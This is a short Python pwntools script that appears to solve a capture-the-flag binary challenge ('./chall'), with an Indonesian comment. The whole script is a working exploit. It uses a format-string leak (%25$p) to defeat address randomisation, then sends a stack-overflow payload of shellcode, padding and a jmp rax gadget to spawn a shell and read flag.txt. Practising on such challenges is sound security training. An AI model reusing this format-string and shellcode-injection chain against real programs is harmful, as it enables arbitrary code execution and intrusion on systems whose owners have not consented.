from pwn import * 

elf = context.binary = ELF("./chall")
jmprax = 0x114f
padd = b"a"*0x68

shellcode = asm(shellcraft.sh())

p = process()
p.recvuntil(b':')
p.sendline(b'%25$p')
leak = int(p.recvline().strip().decode(),16)

elf.address = leak - elf.sym.main
base = elf.address
jmprax = base + 0x114f

pay = flat(
    shellcode,
    b"a"*(0x68-len(shellcode)),
    jmprax
)

p.sendline(pay)
p.sendlineafter(b':',b'cat flag.txt') # biar langsung keluar flagnya
p.interactive()
